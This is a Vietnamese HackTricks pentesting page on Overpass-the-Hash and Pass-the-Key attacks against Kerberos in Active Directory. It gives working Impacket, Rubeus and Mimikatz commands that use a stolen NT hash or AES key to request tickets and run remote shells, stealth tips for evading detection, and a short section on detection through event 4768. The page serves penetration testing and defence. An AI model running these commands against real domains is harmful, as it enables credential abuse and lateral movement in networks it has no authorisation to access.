# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Cuộc tấn công **Overpass The Hash/Pass The Key (PTK)** được thiết kế cho các môi trường hạn chế giao thức NTLM truyền thống và ưu tiên xác thực Kerberos. Cuộc tấn công này tận dụng NTLM hash hoặc khóa AES của người dùng để yêu cầu vé Kerberos, cho phép truy cập trái phép vào các tài nguyên trong mạng.

Nói chính xác:

- **Over-Pass-the-Hash** thường có nghĩa là chuyển **NT hash** thành Kerberos TGT thông qua khóa Kerberos **RC4-HMAC**.
- **Pass-the-Key** là phiên bản tổng quát hơn, trong đó bạn đã có khóa Kerberos như **AES128/AES256** và dùng khóa đó để yêu cầu TGT trực tiếp.

Sự khác biệt này rất quan trọng trong các môi trường được tăng cường bảo mật: nếu **RC4 bị vô hiệu hóa** hoặc KDC không còn mặc định sử dụng RC4, chỉ **NT hash** là chưa đủ và bạn cần **khóa AES** (hoặc mật khẩu dạng rõ để suy ra khóa này).

Để thực hiện cuộc tấn công này, bước đầu tiên là lấy NTLM hash hoặc mật khẩu của tài khoản người dùng mục tiêu. Sau khi có được thông tin này, có thể lấy Ticket Granting Ticket (TGT) cho tài khoản, cho phép kẻ tấn công truy cập các dịch vụ hoặc máy tính mà người dùng có quyền truy cập.

Có thể bắt đầu quy trình bằng các lệnh sau:<sup>[[1]](#references)</sup>

```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

Trong các tình huống cần AES256, có thể sử dụng tùy chọn `-aesKey [AES key]`:<sup>[[1]](#references)</sup>

```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```

`getTGT.py` cũng hỗ trợ yêu cầu trực tiếp service ticket thông qua AS-REQ bằng `-service <SPN>`, hữu ích khi bạn muốn lấy ticket cho một SPN cụ thể mà không cần thêm TGS-REQ:

```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```

Ngoài ra, ticket thu được có thể được sử dụng với nhiều công cụ khác nhau, bao gồm `smbexec.py` hoặc `wmiexec.py`, giúp mở rộng phạm vi tấn công.

Các lỗi như _PyAsn1Error_ hoặc _KDC cannot find the name_ thường được khắc phục bằng cách cập nhật thư viện Impacket hoặc sử dụng hostname thay vì địa chỉ IP, để đảm bảo tương thích với Kerberos KDC.

Một chuỗi lệnh thay thế sử dụng Rubeus.exe minh họa một khía cạnh khác của kỹ thuật này:<sup>[[1]](#references)</sup>

```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

Phương pháp này tương tự cách tiếp cận **Pass the Key**, tập trung vào việc chiếm quyền kiểm soát và sử dụng trực tiếp ticket để xác thực. Trên thực tế:

- `Rubeus asktgt` tự gửi **raw Kerberos AS-REQ/AS-REP** và không cần quyền admin, trừ khi bạn muốn nhắm đến một logon session khác bằng `/luid` hoặc tạo một session riêng bằng `/createnetonly`.<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` chèn credential material vào một logon session nên sẽ **tác động đến LSASS**. Vì vậy, thao tác này thường cần quyền local admin hoặc `SYSTEM` và dễ bị EDR phát hiện hơn.

Ví dụ với Mimikatz:

```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```

Để tuân thủ bảo mật hoạt động và sử dụng AES256, có thể áp dụng lệnh sau:

```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```

`/opsec` có liên quan vì lưu lượng do Rubeus tạo ra hơi khác so với Kerberos gốc của Windows. Cũng lưu ý rằng `/opsec` được thiết kế cho lưu lượng **AES256**; dùng nó với RC4 thường cần `/force`, điều này làm mất phần lớn ý nghĩa vì **RC4 trong các domain hiện đại tự nó đã là một dấu hiệu rõ ràng**.

## Ghi chú phát hiện

Mỗi yêu cầu TGT đều tạo **event `4768`** trên DC. Trong các bản dựng Windows hiện tại, event này chứa nhiều trường hữu ích hơn những tài liệu cũ đề cập:

- `TicketEncryptionType` cho biết enctype được dùng cho TGT đã cấp. Các giá trị thường gặp là `0x17` cho **RC4-HMAC**, `0x11` cho **AES128** và `0x12` cho **AES256**.<sup>[[3]](#references)</sup>
- Các event đã cập nhật cũng hiển thị `SessionKeyEncryptionType`, `PreAuthEncryptionType` và các enctype mà client quảng bá, giúp phân biệt **sự phụ thuộc thực sự vào RC4** với các mặc định cũ dễ gây nhầm lẫn.
- Thấy `0x17` trong môi trường hiện đại là dấu hiệu đáng chú ý cho thấy tài khoản, host hoặc đường dẫn fallback của KDC vẫn cho phép RC4, do đó thuận lợi hơn cho Over-Pass-the-Hash dựa trên NT hash.

Microsoft đã từng bước giảm hành vi mặc định dùng RC4 kể từ các bản cập nhật tăng cường bảo mật Kerberos tháng 11 năm 2022, và hướng dẫn hiện được công bố là **loại bỏ RC4 khỏi các enctype mặc định được giả định cho AD DC trước cuối Q2 2026**. Từ góc độ tấn công, điều này có nghĩa là **Pass-the-Key với AES** ngày càng là phương án đáng tin cậy, trong khi **OpTH chỉ dùng NT hash** kiểu cũ sẽ tiếp tục thất bại thường xuyên hơn trong các môi trường đã được tăng cường bảo mật.<sup>[[3]](#references)</sup>

Để biết thêm chi tiết về các loại mã hóa Kerberos và hành vi cấp ticket liên quan, hãy xem:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Phiên bản kín đáo hơn

> [!WARNING]
> Mỗi phiên đăng nhập chỉ có thể có một TGT đang hoạt động tại một thời điểm, vì vậy hãy cẩn thận.

1. Tạo một phiên đăng nhập mới bằng **`make_token`** từ Cobalt Strike.
2. Sau đó, dùng Rubeus để tạo TGT cho phiên đăng nhập mới mà không ảnh hưởng đến phiên hiện có.

Bạn cũng có thể tạo vùng cách ly tương tự ngay trong Rubeus bằng một phiên **logon type 9** dùng một lần:

```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Điều này giúp tránh ghi đè TGT của phiên hiện tại và thường an toàn hơn so với nhập ticket vào phiên đăng nhập hiện có.

## References

- [1] [Tarlogic - Kerberos (II): Tấn công Kerberos như thế nào?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (Kho lưu trữ GitHub)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Phát hiện và khắc phục việc sử dụng RC4 trong Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
{{#include ../../banners/hacktricks-training.md}}

